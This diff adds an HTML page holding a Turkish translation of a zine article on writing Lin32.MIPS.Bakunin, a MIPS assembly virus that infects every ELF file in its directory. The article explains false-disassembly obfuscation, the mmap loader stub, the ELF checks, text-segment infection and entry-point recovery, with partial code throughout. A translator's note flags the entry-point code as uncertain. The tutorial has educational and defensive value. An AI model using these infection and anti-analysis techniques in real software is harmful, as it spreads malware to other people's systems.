@@ -1,0 +1,326 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+Writing Viruses In MIPS Assembly For Fun (And No Profit)    │                   █   │
+~ S01den                                                    └───────────────────█ ──┘
+
+tmp.out ekibinden S01den tarafından sevgiyle !
+01/2021
+
++----------- İletişim -----------+
+| twitter: @s01den               |
+| mail: S01den@protonmail.com    |
++--------------------------------+
+
+.---\ Giriş /---.
+ 
+Bu kısa(?) yazıda, sizlere Linux/MIPS sistemleri (modemler, Iot cihazlar, oyun konsolları vb.)
+hedef alan ve saf MIPS assembly ile yazdığım Lin32.MIPS.Bakunin[0] zararlısını nasıl yazdığımı
+anlatıyor olacağım. Anlaşıldığı üzere yazdığım bu virüsü yaymadım ve yaymayacağım. 
+Sizler de yayma aptallığını göstermeyin.
+
+Geliştirmek istediğim eğlenceli tekniklerden birkaç tanesini, PIE varlığına rağmen zararlının
+asıl giriş noktasını (OEP) hesaplatmak ya da virüsün asıl kodlarını karmaşıklaştırıp dizilimleri
+ve konumları birkaç byte değiştirerek mahvetmek gibi, başka birçok sürprizle beraber kullandım.
+
+Herhangi bir şeye değinmeden önce Bakunin zararlısının özelliklerini özetleyelim:
+
+- Silvio Cesare'ye ait text dosyalarına bulaşma tekniği[1] sağolsun, bulunulan dizindeki bütün
+  ELF dosyalarını PIE olsun ya da olmasın enfekte etme 
+  (dosyaların text segmentinin tanımını virüsün kodu ile değiştimeyi sağlıyor)
+- Basit ancak güçlü bir tersine mühendisliği zorlaştırma tekniği olarak "false-disassembly[2]" kullanımı
+- Ekrana "X_X" bastırma (Görebileceğiniz üzere epey başarılı bir payload)
+- Bakunin muazzam bir anarşist filozof idi. (Bu değil, gerçeği)
+
+Sizi heyecanlandırdığımıza göre artık Lin32.MIPS.Bakunin kaynak kodunu detaylıca inceleyebiliriz!
+
+.---\  false-disassembly Tekniğinin İmplementasyonu   /---.
+     \       MIPS assembly: Girişin Kodlanması       /
+
+Başlamadan önce kısaca false-disassembly tekniğini açıklamak istiyorum. Bu tersine mühendislik
+karşıtı teknik basitçe ilk birkaç byte değerinin üzerine yazarak byte sıralamalarını ve 
+yerlerini değiştirmek olarak açıklanabilir. Disassembler söz konusu yeni byte değerlerini
+yeniden yorumlarken instruction değerlerinin başındaki "hayalet" byte dizilerinden yola
+çıkacağından, byte değerleri eklendikten sonra disassemble edilmiş kodlar oldukça absürt görünecektir.
+
+Örnek olarak aşağıdaki kod parçası verilebilir. (benim yazdığım virüse ait değil)
+
+-------------------- cut-here --------------------
+
+                          jmp hey+2 # hayalet byte değerlerinin üstünden atlanan kısım
+hey:                      hey:
+   xor %rbx, %rbx             .ascii "\x48\x31"
+   jmp yo            ====&gt;     xor %rbx, %rbx
+                               jmp yo
+---------------------------------------------------
+
+Şayet verilen örnek doğrultusunda false-disassembly uygulanmış ve uygulanmamış kodları 
+karşılaştıracak olursak aşağıdaki kod blokları görülmektedir. (radare2 ftw):
+
+-------------------- cut-here --------------------
+;-- hey:
+0x00401002      4831db         xor rbx, rbx
+0x00401005      eb02           jmp 0x401009
+                          ||
+                          \/
+;-- hey:
+0x00401002      48314831       xor qword [rax + 0x31], rcx
+0x00401006      dbeb           fucomi st(3)
+0x00401008      026631         add ah, byte [rsi + 0x31]
+ ---------------------------------------------------
+
+Bahsettiğimiz tersine mühendislik karşıtı teknik, MIPS mimarisi göz önüne alındığında oldukça 
+kullanışlı bir tekniktir. Çünkü MIPS mimarisinde kullanılan instruction değerlerinin byte 
+uzunlukları sabit olmakla beraber 4 byte uzunluğundadır. Dolayısıyla insruction adresleri
+dördün katları olarak hizalanmak zorundadır. 
+
+(adresler 0x0, 0x4, 0x8 ya da 0xc değerleriyle sonlanmaktadır)
+
+Sonuç olarak, hayalet byte değerleri olarak anlamlı değerler seçmesek dahi istediğimiz byte
+değerlerini hayalet byte değerleri olarak koyabiliriz çünkü byte hizalaması ne koyarsak koyalım bozulmuş olacak:
+
+0x004000b3                    unaligned
+0x004000b4      fc004003       invalid
+0x004000b8      a0182523       sb t8, 0x2523(zero)
+0x004000bc      bdf00003       cache 0x10, 3(t7)
+0x004000c0      a0202524       sb zero, 0x2524(at)
+0x004000c4      0500ff24       bltz t0, 0x3ffd58
+0x004000c8      02106b00       invalid
+0x004000cc      00000c03       sra at, zero, 0x10
+0x004000d0      a0202524       sb zero, 0x2524(at)
+0x004000d4      05000024       bltz t0, 0x400168
+                 ...
+Gördüğünüz üzere sonuç sadece çöp :)
+
+Ne yazık ki, yukarıda da açıkladığım üzere MIPS mimarisinde kafamıza esen her adrese "atlayamıyoruz"; 
+hizalama dolayısıyla yalnızca dördün katları olan adreslere atlamak zorundayız. Bu nedenden dolayı
+yazacağım virüsü giriş ve gövde olarak iki parçada ele almaya karar verdim.
+
+
+Kodun giriş kısmında program akışına devam edebilmek için, hizalanmamış vaziyette duran, gövde diye adlandırdığımız kodu
+çalıştırılabilir bir alana kopyalayacağız.(arkasından gelen .get_vx rutini sağolsun)
+Başka bir deyişle, hizası bozuk olan instruction'ların hizasını düzeltip devam edeceğiz.
+
+--= mmap2 sistem çağrısını çağırma =--
+  # Registerlara dörtten fazla argümanı ($a0...$a3) nasıl vereceğimi bilmiyordum
+  # bu yüzden ben de mmap() çağrısını kullanan basit bir program yazdığım
+  # sonrasında bu programı statik link kullanıp oluşturdum ve 
+  # mmap çağrısının nasıl çağrıldığını görmek için assembly kodlarını inceledim, 
+  # böylece aşağıda gördüğünüz üç satırlık kodu elde ettim
+
+  sw  $zero,20($sp)
+  li  $v0,0
+  sw  $v0,16($sp)
+
+  li $a0, 0
+  li $a1, 0x6a8 # virüsün boyutu
+  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
+  li $a3, 0x0802 # MAP_ANONYMOUS | MAP_PRIVATE
+  li $v0, 4210 # sys_mmap2
+  syscall
+------------------------------
+
+Yukarıdaki assembly kodu şu çağrıyı temsil ediyor:
+
+  mmap2(NULL, 0x6a8, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+
+Hafızada alan ayrıldıktan sonra, virüsün gövdesi için yazdığımız kodları(false-disassembly tekniğini uyguladıktan sonra) kopyalıyoruz. 
+
+--= Virüs gövdesini kopyalama =--
+  bgezal $zero, get_pc  # Direkt instruction adreslerine erişip koda ulaşıyoruz
+                        # 
+  add $t1, $t1, 0x6f    # 0x6f = gövdeye kadar olan byte sayısı
+                        # $t1 gövde adresini içeriyor 
+  move $t2, $v0         # $t2 mmap ile ayarladığımız hafızanın adresini tutuyor 
+  li $t0, 0             # $t0 ise sayacımız olacak
+
+  .get_vx:
+    lb $t3, 0($t1)      # teker teker aldığımız byte değeri $t3 üzerinde tutuluyor
+    sb $t3, 0($t2)      # sonrasında bu byte değerini $t2 üzerinde tuttuğumuz 
+                        # adrese yazıyoruz
+    addi $t0, $t0, 1
+    addi $t1, $t1, 1
+    addi $t2, $t2, 1
+    blt $t0, 0x615, .get_vx # gövde 0x615 bayttan oluşuyor
+
+    jal $v0                 # mmap ile ayrılan bölgeye atlayan kod satırı
+    beq $zero, $zero, eof   # gövde payloadımızı çalıştırdıktan sonra bu satıra dönecek
+
+  get_pc: # $t1 register üzerinde kaydedilen eip (MIPS mimarisinde pc deniyor) 
+          # değerine döndüğümüz kısım
+    move $t1, $ra
+    jr $ra
+---------------------------------
+
+not: "beq" ya da "bgezal" gibi instruction'ları göreli atlamaları 
+(diğer türlü zararlı kodumuzu çalıştıramazdık) yapmak amacıyla virüslerde kullanıyoruz. 
+Klasik atlama komutları (j ya da jal gibi) mutlak adrese göre çalışıyor olmaları nedeniyle
+gerçekleştirmek istediğimiz operasyon için uygun değil.
+
+Virüsümüzün giriş kısmının sonu yalnızca sys_exit sistem çağrısından, 9 tane instruction'a 
+(eof rutini bulaşma aşamasından sonra yeniden yazılacak çünkü PIE olmasına rağmen OEP adresinin hesaplanması gerekiyor)
+yer açmak için koyduğumuz tampon bölgeden ve gövdedeki sıralamayı bozmak için koyduğumuz hayalet
+byte değerlerinden (.ascii "\xeb\x01\xe8") oluşuyor. 
+
+.---\ Bütün dizine zararlı bulaştırma: Gövdenin kodlanması /---.
+
+Artık gövdeyi yazdığımız kısma geldiğimize göre, klasik virüs işlemlerini yapabiliriz.
+
+Başka çalıştırılabilir dosyaları bulaştırmak için virüsümüzün bulunduğu dizindeki potansiyel enfekte edilebilir dosyaları tespit etmesi gerekiyor.
+
+Bulunduğumuz dizinin adını sys_getcwd çağrısı ile elde etmemizin ardından sys_open çağrısı ile dizini açabiliriz. 
+
+Dizini açtıktan sonra, dizin içerisindeki dosyaların adını içeren yapıyı elde etmek için sys_getdents64 çağrısını kullanıyoruz.
+
+Elde ettiğimiz dosya yapısını ise aşağıdaki kod ile işleyebiliriz.
+
+--= "dirent" yaspısının işlenmesi  =--
+li $s0, 0 # s0 sayacımız olacak
+parse_dir:
+  move $s2, $sp # s2 dosya adının adresini barındıracak
+  addi $s2, $s2, 0x13 # d_name
+
+  li $t1, 0
+  addi $t1, $sp, 0x12
+  lb $t1, 0($t1) # t1 artık dosya/dizin tipini tutuyor
+
+  bgezal $zero, infect
+  li $t9, 0
+
+  # get d_reclen (dirent64 yapısının işleyişini inceleyin...)
+  addi $t9, $sp, 0x10
+  lb $t0, 1($t9)
+
+  # buffer position += d_reclen
+  add $s0, $s0, $t0
+
+  add $sp, $sp, $t0
+
+  blt $s0, $s1, parse_dir # eğer sayaç &lt; dosya/dizin sayısı : jmp to parse_dir
+------------------------------------
+
+Sonrasında, bulunduğumuz dizindeki her bir dosyayı mmap çağrısı ile aşağıdaki şekilde açıyoruz:
+
+mmap2(NULL, len_file, PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0)
+
+ardından bu dosyaların virüsümüzü barındırıp barındıramayacağını kontrol ediyoruz:
+
+--= B4zı kontroller =--
+# $s5 mmap çağrısıyla ayrılan alanın adresini barındırıyor
+
+.check_magic:
+  lw $t0, 0($s5)
+  li $t1, 0x7f454c46 # dosyanın ELF olup olmadığını kontrol et (magic byte kontrolü ile)
+  bne $t0, $t1, end
+
+.check_bits:
+  lb $t0, 4($s5)
+  bne $t0, 1, end # burada e_ident[EI_CLASS] değerini kontrol ediyoruz, 
+                  # Bu sayede enfekte etmeye çalıştığımız ELF dosyasının 32/64 bit 
+                  # olup olmadığını kontrol ediyoruz (eğer 64 bit ise, goto end)
+
+.check_signature:
+  lw $t0, 9($s5)  # imza e_hdr.padding yapısında bulunuyor, Lin64.Kropotkine[3]
+                  # yapısında olduğu gibi
+  beq $t0, 0xdeadc0de, end
+----------------------
+
+Bütün bu kontroller sonucunda hala programı sona yönlendirmemişsek artık dosyayı enfekte edebiliriz. 
+Bu işlem için silvio'nun bulaştırma tekniğini kullanıyoruz:
+
+".text segmentinin sonuna kod eklemek için aşağıdaki işlemlerin yapılması gerekmektedir."
+    * ELF başlıklarına yeni kod eklenebilmesi için p_shoff'un artırılması
+    * Program başlıklarında text segmentinin bulunması
+      * Eklenecek kod için p_filesz değerinin artırılması
+      * Eklenecek kod için p_memsz değerinin artırılması
+    * Kodun eklenmesinin ardından her phdr alanı için (text segmenti):
+      * Yeni konumu yansıtmak için kodun eklenmesinin ardından p_offset değerinin artırılması
+    * Kodun eklenmesinin ardından her section için shdr değeri için:
+      * Yeni kod için sh_offset değerinin artırılması
+    * Fiziksel olarak yeni kodun dosyaya eklenmesi - text segmenti p_offset
+      + p_filesz (orijinal)"[1] 
+
+Enfeksiyon işleminin oldukça uzun olması nedeniyle oldukça yorum satırı eklediğimi düşünüyorum,
+dolayısıyla kodumu burada satır satır açıklamayacağım.
+
+Öncelikle virüsün giriş kısmının yazılması gerektiği aklınızda bulunsun. 
+Çünkü mmapp ile ayrılmış alanda çalışırken, giriş kısmını gövde için yaptığımız gibi dışarıdan
+yerleştiremiyoruz(çünkü giriş kısmı mmap ile ayrılan alanda bulunmuyor), dolayısıyla ben de bu kısımları elle yazdım. 
+
+Elle yazılmış giriş kısmınıı kopyaladıktan sonra, OEP noktasını hesaplattığım kodu (yine elle) yazdım.
+Lin64.Kropotkine[3] için kullandığım methodun aynını kullandım. (ELF_master'ın PIE[4]'e rağmen OEP noktasını hesapladığı teknik)
+
+Bu teknik temelde aşağıdaki operasyonu gerçekleştiriyor:
+
+  get_rip() - number_of_bytes_before - new_EP + original-e_hdr.entry
+
+Yukarıda verilen hesabı yapmak için kullanılan MIPS kodu:
+
+
+TODO: Buradan tam emin olamadım
+------------------- elle yazılacak kod -------------------
+ 0411fff5       bal get_pc
+ 00000000       nop
+ 2129fc70       addi t1, t1, -0x74 # bu instruction'dan öncesindeki 
+                                   # byte sayısını çıkart
+ 3401dead       ori at, zero, new_EP
+ 01214822       sub t1, t1, at
+ 2129beef       addi t1, t1, OEP
+ 0060e825       move sp, v1        # stack'i eski haline getir
+ 01200008       jr t1              # Hesaplanan OEP noktasına atla
+------------------------------------------------------------
+
+Bütün bu işlemlerin ardından gövdeyi dosyaya koyup değişiklikleri kaydedebilir 
+(sys_msync ve sys_munmap çağrıları aracılığıyla) ve başka bir dosyayı enfekte etmek üzere sonunda dosyayı kapatabiliriz. 
+
+Bütün dizini enfekte ettikten sonra, yalnızca ("X_X") payloadını çalıştırıp çıkış yapıyoruz!
+
+.---\ Sonuç /---.
+
+Umarım bu yazıyı beğenmişsinizdir! Çünkü ben bu virüsü yazarken çok şey öğrendim, daha önce MIPS mimarisi üzerine hiçbir şey yazmamıştım.
+
+Aynı zamanda umuyorum ki siz de en az benim iki ay boyunca bu virüs üzerinde çalışırken öğrendiklerim kadar bir şeyler öğrenebilmişsinizdir.
+
+.---\ Notlar ve Referanslar /---.
+[0] Kaynak kodun yeri 
+[1] Silvio'nun enfeksiyon üzerine yazdığı yazı 
+    http://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm
+[2] http://www.ouah.org/linux-anti-debugging.txt
+[3] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[4] https://bitlackeys.org/papers/pocorgtfo20.pdf
+
+--- Source ---
+
+- <a href="Linux.Bak0unin.asm">Linux.Bak0unin.asm</a>
+</pre></div></center></body></html>
